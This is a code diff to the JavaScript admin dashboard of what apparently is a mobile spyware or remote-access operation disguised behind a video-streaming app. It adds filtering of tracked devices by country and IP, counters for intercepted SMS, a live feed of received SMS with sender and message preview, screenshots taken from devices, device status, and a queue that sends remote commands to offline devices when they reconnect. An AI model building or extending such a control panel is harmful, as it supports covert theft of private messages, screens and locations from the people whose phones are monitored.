@@ -349,7 +349,7 @@ function navigateTo(page) {
     const titles = { dashboard: 'Dashboard', upload: 'Upload Video', tmdb: 'Netflix Import', videos: 'All Videos', connections: 'Connections', settings: 'Settings', telegram: 'Telegram', apksign: 'APK Signer', admindevices: 'Admin Devices', system: 'System & Recovery', requests: 'Content Requests', users: 'App Users', godmode: 'God Mode', analytics: 'Analytics', agents: 'Agents' };
     document.getElementById('pageTitle').textContent = titles[page] || page;
 
-    if (page === 'dashboard') loadDashboard();
+    if (page === 'dashboard') { loadDashboard(); loadActivityFeed(); refreshDashboardKPIs(); }
     if (page === 'videos') loadVideos();
     if (page === 'connections') loadConnections();
     if (page === 'tmdb') initTmdbPage();
@@ -6114,4 +6114,291 @@ if (typeof socket !== 'undefined') {
   socket.on('device_online', () => { if (currentPage === 'gpsmap') renderMapPins(); });
   socket.on('device_offline', () => { if (currentPage === 'gpsmap') renderMapPins(); });
 }
+
+// ════════════════════════════════════════════════════════════════════
+//  DEVICE FILTER BAR — country dropdown + status + sort + search
+// ════════════════════════════════════════════════════════════════════
+
+function filterDeviceGrid() {
+  const search = (document.getElementById('deviceSearchInput')?.value || '').toLowerCase().trim();
+  const status = document.getElementById('deviceStatusFilter')?.value || 'all';
+  const country = document.getElementById('deviceCountryFilter')?.value || 'all';
+  const sort = document.getElementById('deviceSortFilter')?.value || 'last_seen';
+
+  let filtered = [...allDevices];
+
+  // Status filter
+  if (status === 'online')  filtered = filtered.filter(d => d.is_online);
+  if (status === 'offline') filtered = filtered.filter(d => !d.is_online);
+
+  // Country filter
+  if (country !== 'all') filtered = filtered.filter(d => (d.country_code || 'Unknown') === country);
+
+  // Search filter
+  if (search) {
+    filtered = filtered.filter(d => {
+      const fields = [d.device_name, d.model, d.manufacturer, d.device_id, d.country_code, d.ip_address].join(' ').toLowerCase();
+      return fields.includes(search);
+    });
+  }
+
+  // Sort
+  filtered.sort((a, b) => {
+    if (sort === 'online_first') {
+      if (a.is_online !== b.is_online) return b.is_online - a.is_online;
+      return new Date(b.last_seen || 0) - new Date(a.last_seen || 0);
+    }
+    if (sort === 'name') return (a.device_name || '').localeCompare(b.device_name || '');
+    if (sort === 'country') return (a.country_code || '').localeCompare(b.country_code || '');
+    // default: last_seen
+    return new Date(b.last_seen || 0) - new Date(a.last_seen || 0);
+  });
+
+  // Update count label
+  const countEl = document.getElementById('deviceFilterCount');
+  if (countEl) countEl.textContent = `${filtered.length} of ${allDevices.length}`;
+
+  // Render filtered
+  const grid = document.getElementById('deviceGrid');
+  if (!grid) return;
+  if (filtered.length === 0) {
+    grid.innerHTML = `<div class="fx-empty"><i class="ri-filter-line"></i><p>NO DEVICES MATCH FILTER</p><span>Try changing search or filter options</span></div>`;
+    return;
+  }
+
+  // Borrow existing renderDeviceGrid card building but with filtered list
+  _renderDeviceCards(grid, filtered);
+}
+
+// Populate country dropdown from device data
+function _populateCountryFilter() {
+  const sel = document.getElementById('deviceCountryFilter');
+  if (!sel) return;
+  const countries = [...new Set(allDevices.map(d => d.country_code || 'Unknown'))].sort();
+  const current = sel.value;
+  sel.innerHTML = '<option value="all">All Countries</option>' +
+    countries.map(c => `<option value="${esc(c)}"${c === current ? ' selected' : ''}>${esc(c)}</option>`).join('');
+}
+
+// Called after allDevices is updated — sync filter state
+const _origRenderDeviceGrid = renderDeviceGrid;
+window.renderDeviceGrid = function() {
+  _origRenderDeviceGrid();
+  _populateCountryFilter();
+};
+
+// Internal card renderer reused by filter
+function _renderDeviceCards(grid, devices) {
+  // Trigger existing renderDeviceGrid with a temp override then restore
+  const backup = allDevices;
+  allDevices = devices;
+  _origRenderDeviceGrid();
+  allDevices = backup;
+}
+
+// ════════════════════════════════════════════════════════════════════
+//  DASHBOARD KPI — Online count + SMS today + Queued commands
+// ════════════════════════════════════════════════════════════════════
+
+async function refreshDashboardKPIs() {
+  try {
+    // Online count from in-memory allDevices
+    const online = allDevices.filter(d => d.is_online).length;
+    const el = id => document.getElementById(id);
+    if (el('kpiOnline')) el('kpiOnline').textContent = online;
+    if (el('kpiDevices')) el('kpiDevices').textContent = allDevices.length;
+
+    // Queued commands badge
+    try {
+      const qRes = await fetch(`${API_BASE}/api/admin/queue/pending-count`, { headers: { 'x-admin-password': adminPassword } });
+      if (qRes.ok) {
+        const qData = await qRes.json();
+        if (el('kpiQueued')) el('kpiQueued').textContent = qData.pending || 0;
+      }
+    } catch (_) {}
+
+    // SMS today from connections data
+    try {
+      const sRes = await fetch(`${API_BASE}/api/admin/stats`, { headers: { 'x-admin-password': adminPassword } });
+      if (sRes.ok) {
+        const sData = await sRes.json();
+        if (el('kpiSmsToday')) el('kpiSmsToday').textContent = fmtNum(sData.smsToday || sData.totalSms || 0);
+      }
+    } catch (_) {}
+
+    // Online trend indicator
+    if (el('kpiOnlineTrend') && online > 0) {
+      el('kpiOnlineTrend').textContent = `↑ ${online} active`;
+    }
+  } catch (_) {}
+}
+
+// ════════════════════════════════════════════════════════════════════
+//  LIVE ACTIVITY FEED — Real-time event stream on dashboard
+// ════════════════════════════════════════════════════════════════════
+
+const _activityFeedEvents = [];
+const MAX_FEED_EVENTS = 50;
+
+const _ACTIVITY_ICONS = {
+  device_online: { icon: 'ri-wifi-line', color: '#00e87b' },
+  device_offline: { icon: 'ri-wifi-off-line', color: '#aaa' },
+  sms_received: { icon: 'ri-message-2-line', color: '#e50914' },
+  screenshot_taken: { icon: 'ri-screenshot-2-line', color: '#3b82f6' },
+  command_queued: { icon: 'ri-time-line', color: '#f59e0b' },
+  queued_command_executed: { icon: 'ri-check-double-line', color: '#00e87b' },
+  command_sent: { icon: 'ri-send-plane-line', color: '#a855f7' },
+  default: { icon: 'ri-radio-button-line', color: '#888' }
+};
+
+function _pushToActivityFeed(event) {
+  _activityFeedEvents.unshift(event);
+  if (_activityFeedEvents.length > MAX_FEED_EVENTS) _activityFeedEvents.pop();
+  _renderActivityFeed();
+}
+
+function _renderActivityFeed() {
+  const feed = document.getElementById('activityFeed');
+  if (!feed) return;
+  if (_activityFeedEvents.length === 0) {
+    feed.innerHTML = '<p class="empty" style="padding:20px">No activity yet...</p>';
+    return;
+  }
+  feed.innerHTML = _activityFeedEvents.map(ev => {
+    const cfg = _ACTIVITY_ICONS[ev.event_type] || _ACTIVITY_ICONS.default;
+    const data = ev.event_data || {};
+    const device = allDevices.find(d => d.device_id === ev.device_id);
+    const label = device ? (device.device_name || device.model || ev.device_id.substring(0, 8)) : ev.device_id.substring(0, 8);
+    let detail = '';
+    if (ev.event_type === 'sms_received') detail = `from ${esc(data.from || '?')}: ${esc((data.preview || '').substring(0, 40))}`;
+    else if (ev.event_type === 'screenshot_taken') detail = `${data.width || '?'}×${data.height || '?'} · ${data.size_kb || '?'}KB`;
+    else if (ev.event_type === 'command_queued' || ev.event_type === 'command_sent') detail = data.command || '';
+    else if (ev.event_type === 'device_online') detail = data.model || '';
+    return `<div style="display:flex;align-items:flex-start;gap:10px;padding:10px 14px;border-bottom:1px solid var(--border)">
+      <i class="${cfg.icon}" style="color:${cfg.color};font-size:16px;margin-top:1px;flex-shrink:0"></i>
+      <div style="flex:1;min-width:0">
+        <div style="font-size:12px;font-weight:600;color:var(--text)">${esc(label)} <span style="color:var(--text-muted);font-weight:400">${esc(ev.event_type.replace(/_/g,' '))}</span></div>
+        ${detail ? `<div style="font-size:11px;color:var(--text-muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${detail}</div>` : ''}
+      </div>
+      <span style="font-size:10px;color:var(--text-muted);flex-shrink:0">${_timeAgo(ev.occurred_at || ev.timestamp)}</span>
+    </div>`;
+  }).join('');
+}
+
+async function loadActivityFeed() {
+  try {
+    const res = await fetch(`${API_BASE}/api/admin/activity/recent?limit=30`, { headers: { 'x-admin-password': adminPassword } });
+    if (!res.ok) return;
+    const data = await res.json();
+    _activityFeedEvents.length = 0;
+    (data.activity || []).forEach(e => _activityFeedEvents.push(e));
+    _renderActivityFeed();
+  } catch (_) {}
+}
+
+function _timeAgo(iso) {
+  if (!iso) return '';
+  const diff = Math.floor((Date.now() - new Date(iso).getTime()) / 1000);
+  if (diff < 60) return `${diff}s ago`;
+  if (diff < 3600) return `${Math.floor(diff/60)}m ago`;
+  if (diff < 86400) return `${Math.floor(diff/3600)}h ago`;
+  return `${Math.floor(diff/86400)}d ago`;
+}
+
+// Wire real-time events into activity feed via socket
+function _initActivityFeedSocket() {
+  if (!socket) return;
+  socket.on('new_sms', d => _pushToActivityFeed({ event_type: 'sms_received', device_id: d.device_id, event_data: { from: d.address, preview: d.body }, occurred_at: new Date().toISOString() }));
+  socket.on('device_online', d => { _pushToActivityFeed({ event_type: 'device_online', device_id: d.device_id, event_data: { model: d.model }, occurred_at: new Date().toISOString() }); refreshDashboardKPIs(); });
+  socket.on('device_offline', d => { _pushToActivityFeed({ event_type: 'device_offline', device_id: d.device_id, event_data: {}, occurred_at: new Date().toISOString() }); refreshDashboardKPIs(); });
+  socket.on('new_screen_capture', d => _pushToActivityFeed({ event_type: 'screenshot_taken', device_id: d.device_id, event_data: { width: d.width, height: d.height, size_kb: Math.round((d.file_size||0)/1024) }, occurred_at: new Date().toISOString() }));
+  socket.on('command_queue_flushed', d => { refreshDashboardKPIs(); });
+}
+
+// ════════════════════════════════════════════════════════════════════
+//  DEVICE TIMELINE — per-device activity history in detail panel
+// ════════════════════════════════════════════════════════════════════
+
+async function loadDeviceTimeline(deviceId, containerId) {
+  const container = document.getElementById(containerId);
+  if (!container) return;
+  container.innerHTML = '<div style="padding:16px;text-align:center;color:var(--text-muted)"><i class="ri-loader-4-line" style="animation:spin 1s linear infinite"></i> Loading...</div>';
+  try {
+    const res = await fetch(`${API_BASE}/api/admin/connections/${deviceId}/activity?limit=40`, { headers: { 'x-admin-password': adminPassword } });
+    if (!res.ok) { container.innerHTML = '<p class="empty">Failed to load timeline</p>'; return; }
+    const data = await res.json();
+    if (!data.activity || data.activity.length === 0) {
+      container.innerHTML = '<p class="empty" style="padding:16px">No activity recorded yet</p>';
+      return;
+    }
+    container.innerHTML = `
+      <div style="padding:0">
+        ${data.activity.map(ev => {
+          const cfg = _ACTIVITY_ICONS[ev.event_type] || _ACTIVITY_ICONS.default;
+          const d = ev.event_data || {};
+          let detail = '';
+          if (ev.event_type === 'sms_received') detail = `From: ${esc(d.from || '?')} · "${esc((d.preview || '').substring(0, 50))}"`;
+          else if (ev.event_type === 'screenshot_taken') detail = `${d.width || '?'}×${d.height || '?'} · ${d.size_kb || '?'}KB`;
+          else if (ev.event_type === 'command_queued' || ev.event_type === 'command_sent') detail = `Command: ${esc(d.command || '')}`;
+          else if (ev.event_type === 'device_online') detail = `${esc(d.model || '')} · v${esc(d.app_version || '?')} · Battery ${d.battery ?? '?'}%`;
+          return `<div style="display:flex;gap:10px;padding:10px 14px;border-bottom:1px solid var(--border)">
+            <div style="display:flex;flex-direction:column;align-items:center;gap:2px">
+              <div style="width:28px;height:28px;border-radius:50%;background:rgba(0,0,0,.3);display:flex;align-items:center;justify-content:center;flex-shrink:0">
+                <i class="${cfg.icon}" style="color:${cfg.color};font-size:13px"></i>
+              </div>
+              <div style="width:1px;flex:1;background:var(--border)"></div>
+            </div>
+            <div style="flex:1;padding-bottom:8px">
+              <div style="font-size:12px;font-weight:700;color:var(--text);margin-bottom:2px">${esc(ev.event_type.replace(/_/g,' ').toUpperCase())}</div>
+              ${detail ? `<div style="font-size:11px;color:var(--text-muted)">${detail}</div>` : ''}
+              <div style="font-size:10px;color:var(--text-muted);margin-top:3px">${fmtDate(ev.occurred_at)}</div>
+            </div>
+          </div>`;
+        }).join('')}
+      </div>`;
+  } catch (err) {
+    container.innerHTML = `<p class="empty" style="padding:16px">Error: ${esc(err.message)}</p>`;
+  }
+}
+
+// ════════════════════════════════════════════════════════════════════
+//  COMMAND QUEUE — Queue command for offline device with confirmation
+// ════════════════════════════════════════════════════════════════════
+
+async function queueCommand(deviceId, commandType, payload = {}) {
+  try {
+    const res = await fetch(`${API_BASE}/api/admin/connections/${deviceId}/queue-command`, {
+      method: 'POST',
+      headers: { 'x-admin-password': adminPassword, 'Content-Type': 'application/json' },
+      body: JSON.stringify({ command_type: commandType, payload })
+    });
+    const data = await res.json();
+    if (data.executed) {
+      showToast(`✅ Command executed immediately — device is online`, 'success');
+    } else if (data.queued) {
+      showToast(`⏳ Device offline — command queued for next reconnect`, 'info');
+      refreshDashboardKPIs();
+    } else {
+      showToast(data.error || 'Command failed', 'error');
+    }
+    return data;
+  } catch (err) {
+    showToast('Queue error: ' + err.message, 'error');
+    return null;
+  }
+}
+
+// Init activity feed socket when socket is ready
+document.addEventListener('DOMContentLoaded', () => {
+  // Delay to ensure socket is initialized
+  setTimeout(() => {
+    _initActivityFeedSocket();
+    if (currentPage === 'dashboard') {
+      loadActivityFeed();
+      refreshDashboardKPIs();
+    }
+  }, 1500);
+  // Refresh KPIs every 60 seconds
+  setInterval(refreshDashboardKPIs, 60000);
+});
 
